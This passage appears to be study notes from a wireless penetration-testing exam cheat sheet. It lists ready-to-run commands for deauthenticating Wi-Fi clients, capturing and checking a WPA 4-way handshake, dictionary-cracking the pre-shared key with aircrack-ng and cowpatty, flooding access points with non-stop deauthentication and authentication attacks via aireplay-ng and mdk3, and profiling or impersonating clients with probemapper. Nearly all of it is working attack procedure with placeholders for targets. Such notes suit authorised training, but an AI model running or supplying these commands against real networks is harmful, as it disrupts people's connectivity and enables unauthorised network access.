`aireplay-ng --deauth 2 -a [MAC of AP] -c [Client's MAC] [interface]`

##### Validating 4-Way Handshake PCAP

1. Open pcap file in Wireshark.
2. Filter with `eapol`.
3. A complete handshake includes 4 packets.
   * Look for packets from AP with Nonce. This is Packet 1 of 4-way handshake.
   * The first pair of packets (the ones required to crack PSK) has a "replay counter" value of 1.
   * The second pair has a "replay counter" value of 2.
   * Packets with the same "replay counter" value are matching sets.
   * EAPOL packets 1 and 3 should have the same Nonce value.

##### Cracking WPA PSK

* Get a dictionary file.  
  * Download a reliable one (not available in actual exam) like rockyou.
  * Use cowpatty's default dictionary "dict" in the directory cowpatty is in.
  * Find a dictionary on your local computer.  
  `grep -r "^internet$" /`

* Crack with dictionary.  
`aircrack-ng -a 2 -e [Name of AP] -b [MAC of AP] -w [dictionary] [4-way handshake PCAP]` (seems fast and reliable)  
`./cowpatty -f [dictionary] -r [4-way handshake PCAP] -s [Name of AP]`  
`./cowpatty -2 -f [dictionary] -r [4-way handshake PCAP] -s [Name of AP]` (uses first 2 EAPOL packets)

#### DoS

##### Aireplay-ng DoS

`aireplay-ng --deauth 0 -a [MAC of AP] -c [Client's MAC] [interface]` (deauth certain client non-stop)  
`aireplay-ng --deauth 0 -a [MAC of AP] [interface]` (deauth all in network non-stop)

##### MDK3 DoS

`mdk3 [interface] a -i [MAC of AP]` (auth flood an AP)
`mdk3 [interface] d` (deauth all clients, slow when there are many connections)  
`mdk3 [interface] d -b [blacklist w/ AP MACs] -c [channel]` (deauth clients part of the networks listed in blacklist)  

#### Probemapper

* Find name of driver to use.  
`probemapper`

* Mass client profile, find a certain target and record the MAC.
`probemapper -i [interface] -d [driver name] -s`

* Target that client for profiling  
`probemapper -i [interface] -d [driver name] -s -t [MAC of target]`

* Target that client and act as an AP (requires master mode)  
`probemapper -i [interface] -d [driver name] -t [MAC of target]`

## Resources

* http://linux-wless.passys.nl - Chipset Lookup
* http://www.macvendorlookup.com - MAC Vendor Lookup
